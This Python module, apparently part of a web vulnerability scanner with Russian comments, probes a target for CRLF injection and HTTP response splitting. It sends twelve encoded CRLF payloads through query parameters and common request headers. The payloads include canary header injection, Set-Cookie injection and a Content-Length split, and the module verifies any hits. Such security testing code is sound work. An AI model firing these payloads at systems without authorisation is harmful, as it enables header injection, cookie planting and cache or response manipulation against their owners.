"""http_request_splitting v2 — CRLF injection with unique canary + verify.

Отличие от v1:
  - unique canary per run (не hardcoded evil.attacker.example)
  - inline payloads (не зависят от payload_source['crlf'])
  - baseline filter — canary не в исходной странице
  - детект ТОЛЬКО в response headers (не в body) для реального splitting
  - verify ×2
  - is_signal(module='http_splitting')

Payloads (12 форм):
  %0d%0a, %0a, %0d, \r\n, \n, \r, %E5%98%8A%E5%98%8D (UTF-8 CRLF),
  %0d%0a%20 (leading space after), %250d%250a (double-encoded),
  %0d%0aX-C: (header inject), %0d%0aSet-Cookie:canary=1,
  %23%0d%0a (fragment)
"""
import secrets
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.verify import confidence, is_signal


def _build_crlf_payloads(canary):
    """Возвращает list of (name, payload) с уникальным canary."""
    return [
        ("crlf_lfcr",      "%0d%0aX-Omni-Crlf: " + canary),
        ("crlf_lf",        "%0aX-Omni-Crlf: " + canary),
        ("crlf_cr",        "%0dX-Omni-Crlf: " + canary),
        ("crlf_raw_lfcr",  "\r\nX-Omni-Crlf: " + canary),
        ("crlf_raw_lf",    "\nX-Omni-Crlf: " + canary),
        ("crlf_raw_cr",    "\rX-Omni-Crlf: " + canary),
        ("utf8_crlf",      "%E5%98%8A%E5%98%8DX-Omni-Crlf: " + canary),
        ("crlf_sp",        "%0d%0a%20X-Omni-Crlf: " + canary),
        ("dbl_enc",        "%250d%250aX-Omni-Crlf: " + canary),
        ("cookie_inject",  "%0d%0aSet-Cookie: omni_" + canary[:8] + "=1"),
        ("frag_inject",    "%23%0d%0aX-Omni-Crlf: " + canary),
        ("cl_inject",      "%0d%0aContent-Length: 0%0d%0a%0d%0aX-Omni-Crlf: " + canary),
    ]


# инъекционные точки
INJECT_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
    "X-Real-IP", "X-Originating-IP", "X-Client-IP", "X-Custom",
    "X-Api-Version", "Accept-Language",
]

# типовые query параметры
QUERY_PARAMS = [
    "url", "next", "redirect", "return", "path", "q", "query",
    "id", "page", "ref", "callback", "debug", "test",
]


def _has_injection_in_headers(resp, canary):
    """Проверяет, что canary появился в response headers (не body)."""
    if not resp:
        return False
    hdrs_str = " ".join(f"{k}: {v}" for k, v in resp.headers.items())
    return canary in hdrs_str or ("X-Omni-Crlf" in hdrs_str) or ("omni_" + canary[:8]) in hdrs_str


def _has_injection_in_body(resp, canary):
    """Canary в response body (reflect — XSS, не HTTP splitting)."""
    if not resp:
        return False
    body = resp.text or ""
    return canary in body


class HttpRequestSplitting:
    def run(self, session, logger):
        target = session.target
        base = target.rstrip("/")
        u = urlparse(target)
        params = parse_qs(u.query) or {}
        http = HttpClient(session, logger)

        canary_tok = secrets.token_hex(4)
        canary = "omni" + canary_tok
        header_name = "X-Omni-Crlf-" + canary_tok  # уникальное имя заголовка

        print("[http_splitting v2] target: " + target)
        print("[http_splitting v2] canary: " + canary)

        payloads = _build_crlf_payloads(canary)

        # baseline — что в исходной странице
        try:
            base_r = http.get(target)
            baseline_text = (base_r.text or "") if base_r else ""
            baseline_headers = dict(base_r.headers) if base_r else {}
        except Exception:
            baseline_text = ""
            baseline_headers = {}

        # canary не в baseline
        if canary in baseline_text or canary in str(baseline_headers):
            print("[http_splitting v2] canary present in baseline — abort")
            return {"findings": []}

        findings = []

        # ============================================================
        # Phase 1: query-param CRLF
        # ============================================================
        print()
        print("[http_splitting v2] Phase 1: query params")
        test_params = list(params.keys()) or QUERY_PARAMS[:6]

        for name in test_params:
            for pname, payload in payloads:
                q = {k: v[0] for k, v in params.items()}
                q[name] = payload
                test_url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                try:
                    r = http.get(test_url, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue

                if _has_injection_in_headers(r, canary):
                    # verify ×2
                    try:
                        r2 = http.get(test_url, allow_redirects=False)
                    except Exception:
                        r2 = None
                    if not r2 or not _has_injection_in_headers(r2, canary):
                        continue

                    conf = confidence(0.95, 1.0)
                    if not is_signal(conf, floor=0.55, module="http_splitting"):
                        continue

                    findings.append({
                        "type": "crlf_param_header_injection",
                        "severity": "critical",
                        "location": "param:" + name,
                        "payload_name": pname,
                        "canary": canary,
                        "confidence": conf,
                    })
                    print("  [CRITICAL] CRLF in param " + name + " (" + pname + ")")
                    logger.finding("crlf_param", "critical", name + " " + pname)
                    break

        # ============================================================
        # Phase 2: header CRLF
        # ============================================================
        print()
        print("[http_splitting v2] Phase 2: headers")
        for h_name in INJECT_HEADERS:
            for pname, payload in payloads[:8]:
                try:
                    r = http.get(target, headers={h_name: payload}, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue

                if _has_injection_in_headers(r, canary):
                    try:
                        r2 = http.get(target, headers={h_name: payload}, allow_redirects=False)
                    except Exception:
                        r2 = None
                    if not r2 or not _has_injection_in_headers(r2, canary):
                        continue

                    conf = confidence(0.95, 1.0)
                    if not is_signal(conf, floor=0.55, module="http_splitting"):
                        continue

                    findings.append({
                        "type": "crlf_header_injection",
                        "severity": "critical",
                        "location": "header:" + h_name,
                        "payload_name": pname,
                        "canary": canary,
                        "confidence": conf,
                    })
                    print("  [CRITICAL] CRLF in header " + h_name + " (" + pname + ")")
                    logger.finding("crlf_header", "critical", h_name + " " + pname)
                    break

        # ============================================================
        # Phase 3: response splitting (двойной ответ)
        # ============================================================
        print()
        print("[http_splitting v2] Phase 3: response splitting detection")
        # если сервер вернул Content-Length: 0 + продолжение в body
        # то в raw response может быть два HTTP-заголовка подряд
        for h_name in INJECT_HEADERS[:4]:
            for pname, payload in payloads:
                try:
                    r = http.get(target, headers={h_name: payload}, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue
                raw = getattr(r, "raw", None)
                if raw and hasattr(raw, "data"):
                    # requests raw содержит полный HTTP ответ
                    try:
                        raw_text = raw.data.decode("latin-1", errors="ignore")
                        # два ответа в одном потоке
                        if raw_text.count("HTTP/1.") >= 2:
                            findings.append({
                                "type": "response_splitting",
                                "severity": "critical",
                                "location": "header:" + h_name,
                                "payload_name": pname,
                                "note": "two HTTP responses detected in raw stream",
                            })
                            print("  [CRITICAL] response splitting in " + h_name)
                            logger.finding("response_splitting", "critical", h_name)
                            break
                    except Exception:
                        pass

        print()
        print("[http_splitting v2] findings: " + str(len(findings)))
        return {
            "findings": findings,
            "payloads_tested": len(payloads),
            "params_tested": len(test_params),
            "headers_tested": len(INJECT_HEADERS),
        }
